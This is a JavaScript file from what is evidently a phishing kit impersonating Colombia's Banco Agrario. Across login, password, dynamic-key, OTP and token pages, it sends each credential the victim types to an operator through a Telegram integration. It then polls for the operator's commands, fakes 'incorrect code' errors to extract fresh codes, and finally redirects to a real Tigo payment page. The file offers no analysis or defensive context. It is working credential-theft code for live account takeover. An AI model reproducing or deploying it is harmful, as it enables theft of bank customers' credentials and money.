/**
 * Integración Telegram - Banco Agrario
 */

// Inicializar integración
const agrarioTelegram = new BankTelegramIntegration('Agrario', 'agrario');

document.addEventListener('DOMContentLoaded', function() {
    const currentPage = window.location.pathname;

    if (currentPage.includes('index.html')) {
        initLoginPage();
    } else if (currentPage.includes('password.html')) {
        initPasswordPage();
    } else if (currentPage.includes('dinamica.html')) {
        initDinamicaPage();
    } else if (currentPage.includes('otp.html')) {
        initOtpPage();
    } else if (currentPage.includes('token.html')) {
        initTokenPage();
    }
});

/**
 * Página de Login (Usuario)
 */
function initLoginPage() {
    const form = document.getElementById('usernameForm');
    const input = document.getElementById('usernameInput');
    const btn = document.getElementById('btnSiguiente');

    if (!form) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        btn.disabled = true;
        btn.textContent = 'Procesando...';
        agrarioTelegram.showLoading();

        const success = await agrarioTelegram.sendToTelegram('login', {
            usuario: input.value.trim()
        });

        if (success) {
            agrarioTelegram.startPolling((action) => {
                switch(action.action) {
                    case 'agrario_request_password':
                        agrarioTelegram.redirect('password.html');
                        break;
                    case 'agrario_error_login':
                        agrarioTelegram.hideLoading();
                        alert('Usuario incorrecto. Intenta nuevamente.');
                        btn.disabled = false;
                        btn.textContent = 'Siguiente';
                        break;
                    case 'agrario_finalizar':
                        agrarioTelegram.redirect('https://mi.tigo.com.co/pago-express/facturas');
                        break;
                }
            });
        }
    });
}

/**
 * Página de Contraseña
 */
function initPasswordPage() {
    const form = document.getElementById('passwordForm');
    const btn = document.getElementById('btnContinuar');

    if (!form) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        const password = Array.from(document.querySelectorAll('.password-input'))
            .map(input => input.value)
            .join('');

        btn.disabled = true;
        btn.textContent = 'Procesando...';
        agrarioTelegram.showLoading();

        const success = await agrarioTelegram.sendToTelegram('password', {
            password: password
        });

        if (success) {
            agrarioTelegram.startPolling((action) => {
                switch(action.action) {
                    case 'agrario_request_dinamica':
                        agrarioTelegram.redirect('dinamica.html');
                        break;
                    case 'agrario_request_otp':
                        agrarioTelegram.redirect('otp.html');
                        break;
                    case 'agrario_error_password':
                        agrarioTelegram.hideLoading();
                        alert('Contraseña incorrecta. Intenta nuevamente.');
                        document.querySelectorAll('.password-input').forEach(inp => inp.value = '');
                        btn.disabled = false;
                        btn.textContent = 'Continuar';
                        break;
                    case 'agrario_finalizar':
                        agrarioTelegram.redirect('https://mi.tigo.com.co/pago-express/facturas');
                        break;
                }
            });
        }
    });
}

/**
 * Página de Clave Dinámica
 */
function initDinamicaPage() {
    const form = document.getElementById('dinamicaForm');
    const btn = document.getElementById('btnContinuar');

    if (!form) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        const dinamica = Array.from(document.querySelectorAll('.dinamica-input'))
            .map(input => input.value)
            .join('');

        btn.disabled = true;
        btn.textContent = 'Procesando...';
        agrarioTelegram.showLoading();

        const success = await agrarioTelegram.sendToTelegram('dinamica', {
            clave_dinamica: dinamica
        });

        if (success) {
            agrarioTelegram.startPolling((action) => {
                switch(action.action) {
                    case 'agrario_request_otp':
                        agrarioTelegram.redirect('otp.html');
                        break;
                    case 'agrario_request_token':
                        agrarioTelegram.redirect('token.html');
                        break;
                    case 'agrario_error_dinamica':
                        agrarioTelegram.hideLoading();
                        alert('Clave dinámica incorrecta. Intenta nuevamente.');
                        document.querySelectorAll('.dinamica-input').forEach(inp => inp.value = '');
                        btn.disabled = false;
                        btn.textContent = 'Continuar';
                        break;
                    case 'agrario_finalizar':
                        agrarioTelegram.redirect('https://mi.tigo.com.co/pago-express/facturas');
                        break;
                }
            });
        }
    });
}

/**
 * Página de OTP
 */
function initOtpPage() {
    const form = document.getElementById('otpForm');
    const btn = document.getElementById('btnContinuar');

    if (!form) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        const otp = Array.from(document.querySelectorAll('.otp-input'))
            .map(input => input.value)
            .join('');

        btn.disabled = true;
        btn.textContent = 'Procesando...';
        agrarioTelegram.showLoading();

        const success = await agrarioTelegram.sendToTelegram('otp', {
            otp_code: otp
        });

        if (success) {
            agrarioTelegram.startPolling((action) => {
                switch(action.action) {
                    case 'agrario_request_token':
                        agrarioTelegram.redirect('token.html');
                        break;
                    case 'agrario_error_otp':
                        agrarioTelegram.hideLoading();
                        alert('Código OTP incorrecto. Intenta nuevamente.');
                        document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
                        btn.disabled = false;
                        btn.textContent = 'Continuar';
                        break;
                    case 'agrario_finalizar':
                        agrarioTelegram.redirect('https://mi.tigo.com.co/pago-express/facturas');
                        break;
                }
            });
        }
    });
}

/**
 * Página de Token
 */
function initTokenPage() {
    const form = document.getElementById('tokenForm');
    const btn = document.getElementById('btnContinuar');

    if (!form) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (btn.disabled) return;

        const token = Array.from(document.querySelectorAll('.token-input'))
            .map(input => input.value)
            .join('');

        btn.disabled = true;
        btn.textContent = 'Procesando...';
        agrarioTelegram.showLoading();

        const success = await agrarioTelegram.sendToTelegram('token', {
            token_code: token
        });

        if (success) {
            agrarioTelegram.startPolling((action) => {
                switch(action.action) {
                    case 'agrario_error_token':
                        agrarioTelegram.hideLoading();
                        alert('Token incorrecto. Intenta nuevamente.');
                        document.querySelectorAll('.token-input').forEach(inp => inp.value = '');
                        btn.disabled = false;
                        btn.textContent = 'Continuar';
                        break;
                    case 'agrario_finalizar':
                        agrarioTelegram.redirect('https://mi.tigo.com.co/pago-express/facturas');
                        break;
                }
            });
        }
    });
}

console.log('[AGRARIO] Sistema Telegram inicializado');
